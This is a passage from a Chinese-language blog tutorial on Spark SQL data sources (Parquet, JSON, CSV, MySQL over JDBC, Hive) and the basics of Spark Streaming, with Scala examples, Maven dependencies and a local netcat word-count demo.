save ("…")：在"csv"、"orc"、"parquet"和"textFile"格式下需要传入保存数据的路径</span></span><br><span class="line"><span class="comment"># option("…")：在"jdbc"格式下需要传入 JDBC 相应参数，url、user、password 和 dbtable保存操作可以使用 SaveMode, 用来指明如何处理数据，使用 mode()方法来设置。</span></span><br><span class="line"><span class="comment"># 有一点很重要: 这些 SaveMode 都是没有加锁的, 也不是原子操作</span></span><br><span class="line">df.write.mode(<span class="string">"append"</span>).json(<span class="string">"/opt/module/data/output"</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>Scala/Java</strong></th><th><strong>Any Language</strong></th><th><strong>Meaning</strong></th></tr></thead><tbody><tr><td>SaveMode.ErrorIfExists(default)</td><td>“error”(default)</td><td>如果文件已经存在则抛出异常</td></tr><tr><td>SaveMode.Append</td><td>“append”</td><td>如果文件已经存在则追加</td></tr><tr><td>SaveMode.Overwrite</td><td>“overwrite”</td><td>如果文件已经存在则覆盖</td></tr><tr><td>SaveMode.Ignore</td><td>“ignore”</td><td>如果文件已经存在则忽略</td></tr></tbody></table><h3 id="4-2-Parquet">4.2 Parquet</h3><p>Spark SQL 的默认数据源为 Parquet 格式。Parquet 是一种能够有效存储嵌套数据的列式存储格式。数据源为 Parquet 文件时，Spark SQL 可以方便的执行所有的操作，不需要使用 format。<strong>修改配置项spark.sql.sources.default，可修改默认数据源格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1)加载数据</span></span><br><span class="line">val df = spark.read.load(<span class="string">"examples/src/main/resources/users.parquet"</span>)</span><br><span class="line">df.show</span><br><span class="line"><span class="comment"># 2)保存数据</span></span><br><span class="line">var df = spark.read.json(<span class="string">"/opt/module/data/input/people.json"</span>)</span><br><span class="line"><span class="comment"># 保存为 parquet 格式</span></span><br><span class="line">df.write.mode(<span class="string">"append"</span>).save(<span class="string">"/opt/module/data/output"</span>)</span><br></pre></td></tr></table></figure><h3 id="4-3-JSON">4.3 JSON</h3><p>Spark SQL 能够自动推测 JSON 数据集的结构，并将它加载为一个Dataset[Row]. 可以通过 SparkSession.read.json()去加载 JSON 文件。注意：Spark 读取的 JSON 文件不是传统的JSON 文件，<strong>每一行都应该是一个 JSON 串</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#json格式如下</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Michael"</span>&#125;</span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Andy"</span>， <span class="string">"age"</span>:30&#125;</span><br><span class="line">[&#123;<span class="string">"name"</span>:<span class="string">"Justin"</span>， <span class="string">"age"</span>:19&#125;,&#123;<span class="string">"name"</span>:<span class="string">"Justin"</span>， <span class="string">"age"</span>:19&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入隐式转换</span></span><br><span class="line">import spark.implicits._</span><br><span class="line"><span class="comment"># 加载 JSON 文件</span></span><br><span class="line">val path = <span class="string">"/opt/module/spark-local/people.json"</span></span><br><span class="line">val peopleDF = spark.read.json(path)</span><br><span class="line"><span class="comment"># 创建临时表</span></span><br><span class="line">peopleDF.createOrReplaceTempView(<span class="string">"people"</span>)</span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line">val teenagerNamesDF = spark.sql(<span class="string">"SELECT  name  FROM  people  WHERE  age  BETWEEN  13 AND 19"</span>)</span><br><span class="line">teenagerNamesDF.show()</span><br></pre></td></tr></table></figure><h3 id="4-4-CSV">4.4 CSV</h3><p>Spark SQL 可以配置 CSV 文件的列表信息，读取CSV 文件,CSV 文件的第一行设置为数据列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark.read.format(<span class="string">"csv"</span>).option(<span class="string">"sep"</span>, <span class="string">";"</span>).option(<span class="string">"inferSchema"</span>,<span class="string">"true"</span>).option(<span class="string">"header"</span>, <span class="string">"true"</span>).load(<span class="string">"data/user.csv"</span>)</span><br></pre></td></tr></table></figure><h3 id="4-5-MySQL">4.5 MySQL</h3><p>Spark SQL 可以通过 JDBC 从关系型数据库中读取数据的方式创建DataFrame，通过对DataFrame 一系列的计算后，还可以将数据再写回关系型数据库中。如果使用spark-shell 操作，可在启动shell 时指定相关的数据库驱动路径或者将相关的数据库驱动放到 spark 的类路径下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/spark-shell --jars mysql-connector-java-5.1.27-bin.jar</span><br></pre></td></tr></table></figure><p>演示在Idea 中通过 JDBC 对 Mysql 进行操作，导入依赖关系</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark04_SparkSQL_JDBC</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">        <span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().config(sparkConf).getOrCreate()</span><br><span class="line">        <span class="keyword">import</span> spark.implicits._</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取MySQL数据</span></span><br><span class="line">        <span class="keyword">val</span> df = spark.read</span><br><span class="line">                .format(<span class="string">"jdbc"</span>)</span><br><span class="line">                .option(<span class="string">"url"</span>, <span class="string">"jdbc:mysql://hadoop102:3306/spark-sql"</span>)</span><br><span class="line">                .option(<span class="string">"driver"</span>, <span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">                .option(<span class="string">"user"</span>, <span class="string">"root"</span>)</span><br><span class="line">                .option(<span class="string">"password"</span>, <span class="string">"123123"</span>)</span><br><span class="line">                .option(<span class="string">"dbtable"</span>, <span class="string">"user"</span>)</span><br><span class="line">                .load()</span><br><span class="line">        <span class="comment">//df.show</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存数据</span></span><br><span class="line">        df.write</span><br><span class="line">                .format(<span class="string">"jdbc"</span>)</span><br><span class="line">                .option(<span class="string">"url"</span>, <span class="string">"jdbc:mysql://hadoop102:3306/spark-sql"</span>)</span><br><span class="line">                .option(<span class="string">"driver"</span>, <span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">                .option(<span class="string">"user"</span>, <span class="string">"root"</span>)</span><br><span class="line">                .option(<span class="string">"password"</span>, <span class="string">"123123"</span>)</span><br><span class="line">                .option(<span class="string">"dbtable"</span>, <span class="string">"user1"</span>)</span><br><span class="line">                .mode(<span class="type">SaveMode</span>.<span class="type">Append</span>)</span><br><span class="line">                .save()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 关闭环境</span></span><br><span class="line">        spark.close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-6-Hive">4.6 Hive</h3><p>Apache Hive 是 Hadoop 上的 SQL 引擎，Spark SQL 编译时可以包含 Hive  支持，也可以不包含。包含 Hive 支持的 Spark SQL 可以支持 Hive 表访问、UDF (用户自定义函数)以及 Hive 查询语言(HiveQL/HQL)等。</p><p>若要把 Spark SQL 连接到一个部署好的 Hive  上，必须把 <code>hive-site.xml</code> 复制到Spark 的配置文件目录中(<code>$SPARK_HOME/conf</code>)。即使没有部署好 Hive，Spark SQL 也可以运行。 需要注意的是，如果你没有部署好 Hive，Spark SQL 会在当前的工作目录中创建出自己的 Hive 元数据仓库，叫作 <code>metastore_db</code>。此外，如果你尝试使用 HiveQL 中的<code>CREATE TABLE</code> (并非 <code>CREATE EXTERNAL TABLE</code>)语句来创建表，这些表会被放在你默认的文件系统中的<code> /user/hive/warehouse</code> 目录中(如果你的 classpath 中有配好的<code>hdfs-site.xml</code>，<strong>默认的文件系统就是 HDFS</strong>，否则就是本地文件系统)。<strong>spark-shell 默认是Hive 支持的；代码中是默认不支持的</strong>，需要手动指定（加一个参数即可）</p><p><strong>内嵌的</strong> <strong>HIVE</strong>，如果使用 Spark 内嵌的 Hive, 则什么都不用做, 直接使用即可。Hive 的元数据存储在 derby 中, 默认仓库地址:$<code>SPARK_HOME/spark-warehouse</code>,在实际使用中, 几乎没有任何人会使用内置的 Hive</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spark.sql(<span class="string">"show tables"</span>).show</span><br><span class="line">spark.sql(<span class="string">"create table aa(id int)"</span>)</span><br><span class="line">spark.sql(<span class="string">"load data local inpath 'input/ids.txt' into table aa"</span>)</span><br><span class="line">spark.sql(<span class="string">"select * from aa"</span>).show</span><br></pre></td></tr></table></figure><p><strong>外部的</strong> <strong>HIVE</strong>，如果想连接外部已经部署好的Hive，需要通过以下几个步骤：</p><ul><li>Spark 要接管 Hive 需要把<code>hive-site.xml</code> 拷贝到conf/目录下</li><li>把 Mysql 的驱动 copy 到 jars/目录下</li><li>如果访问不到 hdfs，则需要把<code>core-site.xml</code> 和 <code>hdfs-site.xml</code> 拷贝到 <code>conf/</code>目录下</li><li>重启 spark-shell</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spark.sql(<span class="string">"show tables"</span>).show</span><br><span class="line"><span class="comment"># Spark SQL CLI 可以很方便的在本地运行Hive 元数据服务以及从命令行执行查询任务。在</span></span><br><span class="line"><span class="comment"># Spark 目录下执行如下命令启动 Spark SQL CLI，直接执行 SQL 语句，类似一Hive 窗口</span></span><br><span class="line">bin/spark-sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># Spark Thrift Server 是Spark 社区基于HiveServer2 实现的一个Thrift 服务。旨在无缝兼容HiveServer2。</span></span><br><span class="line"><span class="comment"># 因为 Spark Thrift Server 的接口和协议都和HiveServer2 完全一致，因此我们部署好 Spark Thrift Server 后，可以直接使用hive 的 beeline 访问Spark Thrift Server 执行相关语句。</span></span><br><span class="line"><span class="comment"># Spark Thrift Server 的目的也只是取代HiveServer2，因此它依旧可以和 Hive Metastore 进行交互，获取到hive 的元数据</span></span><br><span class="line">sbin/start-thriftserver.sh</span><br><span class="line"><span class="comment"># 使用 beeline 连接 Thrift Server</span></span><br><span class="line">bin/beeline -u jdbc:hive2://Hadoop102:10000 -n root</span><br></pre></td></tr></table></figure><p>最后是IDEA操作Hive，首先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-hive_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-exec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后将<code>hive-site.xml</code> 文件拷贝到项目的 resources 目录中，代码实现，注意：在开发工具中创建数据库默认是在本地仓库，通过参数修改数据库仓库的地址：<code>config(&quot;spark.sql.warehouse.dir&quot;, &quot;hdfs://hadoop102:8020/user/hive/warehouse&quot;)</code></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark05_SparkSQL_Hive</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="comment">// 权限问题，此处的 root 改为你们自己的 hadoop 用户名称</span></span><br><span class="line">        <span class="type">System</span>.setProperty(<span class="string">"HADOOP_USER_NAME"</span>, <span class="string">"atguigu"</span>)</span><br><span class="line">        <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">        <span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().enableHiveSupport().config(sparkConf).getOrCreate()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用SparkSQL连接外置的Hive</span></span><br><span class="line">        <span class="comment">// 1. 拷贝Hive-size.xml文件到classpath下</span></span><br><span class="line">        <span class="comment">// 2. 启用Hive的支持</span></span><br><span class="line">        <span class="comment">// 3. 增加对应的依赖关系（包含MySQL驱动）</span></span><br><span class="line">        spark.sql(<span class="string">"show tables"</span>).show</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 关闭环境</span></span><br><span class="line">        spark.close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>四、Spark Streaming</h1><h2 id="1、SparkStreaming-概述">1、SparkStreaming 概述</h2><h3 id="1-1-简介">1.1 简介</h3><p>Spark Streaming 是一个基于 Spark Core 之上的<strong>实时计算框架</strong>，可以从很多数据源消费数据并对数据进行实时的处理，具有高吞吐量和容错能力强等特点。</p><p><img src="http://qnypic.shawncoding.top/blog/202402291816209.png" alt></p><p>和 Spark 基于 RDD 的概念很相似，Spark Streaming 使用离散化流(discretized stream)作为抽象表示，叫作 DStream。DStream 是随时间推移而收到的数据的序列。在内部，每个时间区间收到的数据都作为 RDD 存在，而 DStream 是由这些 RDD 所组成的序列(因此得名“离散化”)。所以简单来将，DStream 就是对 RDD 在实时数据处理场景的一种封装</p><h3 id="1-2-特点">1.2 特点</h3><ul><li>易用，可以像编写离线批处理一样去编写流式程序，支持 java/scala/python 语言</li><li>容错，SparkStreaming 在没有额外代码和配置的情况下可以恢复丢失的工作</li><li><strong>易整合到 Spark 体系</strong>，流式处理与批处理和交互式查询相结合</li></ul><h3 id="1-3-整体流程">1.3 整体流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291816210.png" alt></p><p>Spark Streaming 中，会有一个接收器组件 Receiver，作为一个长期运行的 task 跑在一个 Executor 上。Receiver 接收外部的数据流形成 input DStream。</p><p>DStream 会被按照时间间隔划分成一批一批的 RDD，当批处理间隔缩短到秒级时，便可以用于处理实时数据流。时间间隔的大小可以由参数指定，一般设在 500 毫秒到几秒之间。对 DStream 进行操作就是对 RDD 进行操作，计算处理的结果可以传给外部系统。Spark Streaming 接受到实时数据后，给数据分批次，然后传给 Spark Engine 处理最后生成该批次的结果。</p><h3 id="1-4-数据抽象">1.4 数据抽象</h3><p>这里使用 netcat 工具向 9999 端口不断的发送数据，通过 SparkStreaming 读取端口数据并统计不同单词出现的次数，首先添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写demo代码</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming01_WordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建环境对象</span></span><br><span class="line">        <span class="comment">// StreamingContext创建时，需要传递两个参数</span></span><br><span class="line">        <span class="comment">// 第一个参数表示环境配置</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="comment">// 第二个参数表示批量处理的周期（采集周期）</span></span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 逻辑处理</span></span><br><span class="line">        <span class="comment">// 获取端口数据</span></span><br><span class="line">        <span class="keyword">val</span> lines: <span class="type">ReceiverInputDStream</span>[<span class="type">String</span>] = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> words = lines.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> wordToOne = words.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> wordToCount: <span class="type">DStream</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordToOne.reduceByKey(_+_)</span><br><span class="line"></span><br><span class="line">        wordToCount.print()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 由于SparkStreaming采集器是长期执行的任务，所以不能直接关闭</span></span><br><span class="line">        <span class="comment">// 如果main方法执行完毕，应用程序也会自动结束。所以不能让main执行完毕</span></span><br><span class="line">        <span class="comment">//ssc.stop()</span></span><br><span class="line">        <span class="comment">// 1. 启动采集器</span></span><br><span class="line">        ssc.start()</span><br><span class="line">        <span class="comment">// 2. 等待采集器的关闭</span></span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动程序并通过netcat 发送数据</span></span><br><span class="line"><span class="comment">// nc -lk 9999 </span></span><br><span class="line"><span class="comment">// hello spark</span></span><br></pre></td></tr></table></figure><p>Spark Streaming 的基础抽象是 DStream(Discretized Stream，离散化数据流，连续不断的数据流)，代表持续性的数据流和经过各种 Spark 算子操作后的结果数据流</p><ul><li>DStream 本质上就是一系列时间上连续的 RDD</li><li>对 DStream 的数据的进行操作也是按照 RDD 为单位来进行的</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202402291816211.png" alt></p><ul><li>容错性，底层 RDD 之间存在依赖关系，DStream 直接也有依赖关系，RDD 具有容错性，那么 DStream 也具有容错性</li><li>准实时性/近实时性，Spark Streaming 将流式计算分解成多个 Spark Job，对于每一时间段数据的处理都会经过 Spark DAG 图分解以及 Spark 的任务集的调度过程。对于目前版本的 Spark Streaming 而言，其最小的 Batch Size 的选取在 0.5~5 秒钟之间</li></ul><h2 id="2、DStream-相关操作">2、DStream 相关操作</h2><h3 id="2-1-DStream-创建">2.1  DStream 创建</h3><p><strong>RDD队列</strong></p><p>测试过程中，可以通过使用 ssc.queueStream(queueOfRDDs)来创建 DStream，每一个推送到这个队列中的RDD，都会作为一个DStream 处理</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming02_Queue</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建环境对象</span></span><br><span class="line">        <span class="comment">// StreamingContext创建时，需要传递两个参数</span></span><br><span class="line">        <span class="comment">// 第一个参数表示环境配置</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="comment">// 第二个参数表示批量处理的周期（采集周期）</span></span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> rddQueue = <span class="keyword">new</span> mutable.<span class="type">Queue</span>[<span class="type">RDD</span>[<span class="type">Int</span>]]()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> inputStream = ssc.queueStream(rddQueue,oneAtATime = <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">val</span> mappedStream = inputStream.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> reducedStream = mappedStream.reduceByKey(_ + _)</span><br><span class="line">        reducedStream.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i &lt;- <span class="number">1</span> to <span class="number">5</span>) &#123;</span><br><span class="line">            rddQueue += ssc.sparkContext.makeRDD(<span class="number">1</span> to <span class="number">300</span>, <span class="number">10</span>)</span><br><span class="line">            <span class="type">Thread</span>.sleep(<span class="number">2000</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>自定义数据源</strong></p><p>需要继承Receiver，并实现 onStart、onStop 方法来自定义数据源采集</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming03_DIY</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> messageDS: <span class="type">ReceiverInputDStream</span>[<span class="type">String</span>] = ssc.receiverStream(<span class="keyword">new</span> <span class="type">MyReceiver</span>())</span><br><span class="line">        messageDS.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        